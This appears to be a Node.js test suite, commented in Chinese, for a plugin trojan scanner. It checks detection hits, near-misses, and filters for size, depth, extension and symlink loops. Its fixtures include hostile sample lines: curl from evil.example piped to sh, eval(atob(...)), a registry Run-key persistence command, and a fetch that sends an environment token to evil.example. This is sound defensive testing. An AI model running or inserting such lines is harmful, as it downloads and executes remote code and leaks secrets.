'use strict';

// scan.js 深测：5 类木马模式逐一命中/近失、大小写不敏感、\u0065val 混淆保守
// 不检测（pin）、文件过滤器（单文件/总预算/深度/发现上限/点目录/内置豁免/
// 扩展名/二进制/缺失根）、labelOf 默认相对路径、符号链接环终止。
// 全部临时目录注入，零网络、零真实 ~/.dsh。

const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');

const {
  scanDir, TROJAN_PATTERNS, SCAN_MAX_FILE_BYTES, SCAN_MAX_TOTAL_BYTES, SCAN_EXTS,
} = require('../plugin-core/lib/scan');

const tmp = (t) => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'pc-scan-'));
  t.after(() => fs.rmSync(dir, { recursive: true, force: true }));
  return dir;
};

/** 写单个 .js 文件并扫描，返回 findings。 */
function scanOne(t, content, opts = {}) {
  const dir = tmp(t);
  fs.writeFileSync(path.join(dir, 'x.js'), content);
  return scanDir(Object.assign({ root: dir }, opts));
}

// ── 1. 5 类 TROJAN_PATTERNS 命中 / 近失 / 大小写 / \u0065val 混淆 ────────────

test('scanDir: 5 类木马模式逐一命中（同一文件报出全部命中模式）', (t) => {
  const hits = [
    ['TROJAN_REMOTE_EXEC', "execSync('curl https://evil.example/payload.sh') | sh"],
    ['TROJAN_DOWNLOAD_EXEC', "const u = 'curl https://evil.example/payload.sh | sh';"],
    ['TROJAN_BASE64_EVAL', "eval(atob('SGVsbG8='));"],
    ['TROJAN_PERSISTENCE', "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v evil /t REG_SZ /d x"],
    ['TROJAN_EXFIL_ENV', "const t = process.env.TOKEN; fetch('https://evil.example/' + t);"],
  ];
  assert.equal(hits.length, TROJAN_PATTERNS.length, '矩阵与模式表一一对应');
  for (const [code, payload] of hits) {
    const f = scanOne(t, payload);
    const codes = f.map((x) => x.code);
    assert.ok(codes.includes(code), code + ' 应命中');
    assert.ok(f.length >= 1, code + ' 至少一条发现');
    assert.ok(f.every((x) => x.severity === 'high'), code + ' 命中的 severity 均为 high');
  }
});

test('scanDir: 5 类模式近失样本不误报', (t) => {
  const misses = [
    "execSyncSafe('curl https://evil.example/payload.sh')",
    "const u = 'curl https://evil.example/payload.sh';",
    "eval('SGVsbG8=');",
    "reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
    "const t = process.env.TOKEN;",
  ];
  for (const payload of misses) {
    const f = scanOne(t, payload);
    assert.equal(f.length, 0, '不应误报: ' + payload);
  }
});

test('scanDir: 模式大小写不敏感（i 标志）', (t) => {
  const f = scanOne(t, "EXECSYNC('CURL https://evil.example/p.sh') | SH");
  assert.ok(f.length >= 1);
  assert.ok(f.map((x) => x.code).includes('TROJAN_REMOTE_EXEC'));
});

test('scanDir: \\u0065val 混淆不检测（静态扫描刻意保守，不解码字符串转义）', (t) => {
  // 运行时 JS 会把 \u0065val 解析为 eval，但静态扫描按原始文本匹配，
  // 看到的是字面 `\u0065val`（不含子串 `eval`）→ 不命中。这是文档化的保守
  // 取舍：宁可不报（漏报），也不执行/解析插件代码。pin 无发现。
  const f = scanOne(t, "\\u0065val(atob('aGVsbG8='));");
  assert.equal(f.length, 0);
});

// ── 2. 文件过滤器 ───────────────────────────────────────────────────────────

test('scanDir: 单文件 >2MB 跳过（即便内含命中模式）', (t) => {
  const dir = tmp(t);
  const big = Buffer.concat([
    Buffer.alloc(SCAN_MAX_FILE_BYTES + 1, 0x61),
    Buffer.from("execSync('curl https://x') | sh"),
  ]);
  fs.writeFileSync(path.join(dir, 'big.js'), big);
  assert.ok(fs.statSync(path.join(dir, 'big.js')).size > SCAN_MAX_FILE_BYTES, '文件确实超过单文件上限');
  assert.deepEqual(scanDir({ root: dir }), []);
});

test('scanDir: 总扫描预算 32MB 用尽后跳过后续文件', (t) => {
  const dir = tmp(t);
  // 16 × 2MB = 32MB（单文件恰好等于 2MB 上限，不算 > 上限，会消耗预算）。
  for (let i = 0; i < 16; i += 1) {
    const name = 'a' + String(i).padStart(2, '0') + '.js';
    fs.writeFileSync(path.join(dir, name), Buffer.alloc(SCAN_MAX_FILE_BYTES, 0x61));
  }
  // 第 17 个文件在子目录 zzz 下（排序靠后），预算已耗尽 → 命中模式被跳过。
  fs.mkdirSync(path.join(dir, 'zzz'), { recursive: true });
  fs.writeFileSync(path.join(dir, 'zzz', 'evil.js'), "execSync('curl https://x') | sh");
  const findings = scanDir({ root: dir, maxDepth: 6 });
  assert.equal(findings.length, 0, '预算耗尽后不再扫描，命中模式被跳过');
});

test('scanDir: maxDepth 生效（过深目录不扫）', (t) => {
  const dir = tmp(t);
  const deep = path.join(dir, 'a', 'b', 'c');
  fs.mkdirSync(deep, { recursive: true });
  fs.writeFileSync(path.join(deep, 'evil.js'), "eval(atob('x'))");
  assert.deepEqual(scanDir({ root: dir, maxDepth: 2 }), [], '深度 3 的 evil.js 不被扫描');
  assert.equal(scanDir({ root: dir, maxDepth: 3 }).length, 1, '深度 3 命中');
});

test('scanDir: maxFindings 上限（发现数 ≤ 上限）', (t) => {
  const dir = tmp(t);
  for (let i = 0; i < 30; i += 1) {
    fs.writeFileSync(path.join(dir, 'evil' + i + '.js'), "eval(atob('x'))");
  }
  const findings = scanDir({ root: dir, maxFindings: 5 });
  assert.equal(findings.length, 5, '精确停在上限');
  assert.ok(findings.length <= 5);
});

test('scanDir: 点目录默认只跳过 .pnpm（任意点目录不再盲跳）', (t) => {
  const dir = tmp(t);
  fs.mkdirSync(path.join(dir, '.pnpm'), { recursive: true });
  fs.mkdirSync(path.join(dir, '.hidden'), { recursive: true });
  fs.writeFileSync(path.join(dir, '.pnpm', 'evil.js'), "eval(atob('x'))");
  fs.writeFileSync(path.join(dir, '.hidden', 'evil.js'), "eval(atob('x'))");
  const findings = scanDir({ root: dir });
  assert.ok(findings.some((f) => f.file.includes(path.sep + '.hidden' + path.sep)), '.hidden 默认被扫描');
  assert.ok(!findings.some((f) => f.file.includes(path.sep + '.pnpm' + path.sep)), '.pnpm 仍被跳过');
  assert.ok(scanDir({ root: dir, skipDotDirs: false }).length >= 2, '关闭跳过后两者都命中');
});

test('scanDir: builtinNames 命中 package.json name 时豁免整个包', (t) => {
  const dir = tmp(t);
  fs.mkdirSync(path.join(dir, 'builtin'), { recursive: true });
  fs.writeFileSync(path.join(dir, 'builtin', 'package.json'), JSON.stringify({ name: 'builtin-pkg' }));
  fs.writeFileSync(path.join(dir, 'builtin', 'index.js'), "eval(atob('x'))");
  assert.deepEqual(scanDir({ root: dir, builtinNames: new Set(['builtin-pkg']) }), [], '内置包不扫');
  assert.equal(scanDir({ root: dir }).length, 1, '非豁免时命中');
});

test('scanDir: 非匹配扩展名（.txt/.png）不扫描', (t) => {
  const dir = tmp(t);
  fs.writeFileSync(path.join(dir, 'evil.txt'), "eval(atob('x'))");
  fs.writeFileSync(path.join(dir, 'evil.png'), "eval(atob('x'))");
  assert.deepEqual(scanDir({ root: dir }), [], 'txt/png 不在 SCAN_EXTS');
  fs.writeFileSync(path.join(dir, 'evil.js'), "eval(atob('x'))");
  assert.equal(scanDir({ root: dir }).length, 1);
  assert.ok(SCAN_EXTS.test('evil.js'));
});

test('scanDir: 二进制（含 NUL）文件不崩溃、零发现', (t) => {
  const dir = tmp(t);
  // NUL 字节插进每个关键词内部（`e\0v\0a\0l` / `c\0u\0r\0l`），静态扫描按原文
  // 匹配不到任何模式；高位字节按 UTF-8 解码为替换字符也不影响。零发现、不崩溃。
  const bin = Buffer.concat([
    Buffer.from([0xff, 0xfe, 0x00, 0x01, 0x02, 0x00]),
    Buffer.from("e\0v\0a\0l(a\0t\0o\0b('x')) c\0u\0r\0l https://x | sh", 'utf8'),
  ]);
  fs.writeFileSync(path.join(dir, 'evil.js'), bin);
  assert.deepEqual(scanDir({ root: dir }), [], 'NUL 打断模式匹配，且不抛异常');
});

test('scanDir: 缺失根目录返回空数组', () => {
  const missing = path.join(os.tmpdir(), 'pc-scan-definitely-missing-' + Date.now());
  assert.deepEqual(scanDir({ root: missing }), []);
});

// ── 3. labelOf 默认相对路径 ─────────────────────────────────────────────────

test('scanDir: labelOf 默认相对 root（message 含相对路径）', (t) => {
  const dir = tmp(t);
  fs.mkdirSync(path.join(dir, 'lib'), { recursive: true });
  const evil = path.join(dir, 'lib', 'evil.js');
  fs.writeFileSync(evil, "eval(atob('x'))");
  const [f] = scanDir({ root: dir });
  assert.ok(f, '应有发现');
  assert.equal(f.file, evil, 'file 字段为绝对路径');
  assert.ok(f.message.includes(path.relative(dir, evil)), 'message 使用相对路径');
  assert.ok(!f.message.includes(evil), 'message 不泄漏绝对路径');
});

// ── 4. 符号链接目录环 → 终止（不递归跟随链接） ─────────────────────────────

test('scanDir: 符号链接目录环不造成无限递归', (t) => {
  const dir = tmp(t);
  fs.mkdirSync(path.join(dir, 'real'), { recursive: true });
  fs.writeFileSync(path.join(dir, 'real', 'evil.js'), "eval(atob('x'))");
  try {
    fs.symlinkSync(dir, path.join(dir, 'loop'), 'junction');
  } catch {
    t.skip('无法创建 junction（可能无权限），跳过');
    return;
  }
  // loop → 根目录自身：若跟随链接会无限递归；scanDir 只对 isDirectory() 递归，
  // 符号链接 isDirectory() 为 false → 被跳过。应正常终止且 real/ 仍命中。
  const findings = scanDir({ root: dir });
  assert.equal(findings.length, 1, '仅 real/evil.js 命中，loop 链接不跟随');
  assert.ok(findings[0].file.includes(path.sep + 'real' + path.sep));
});
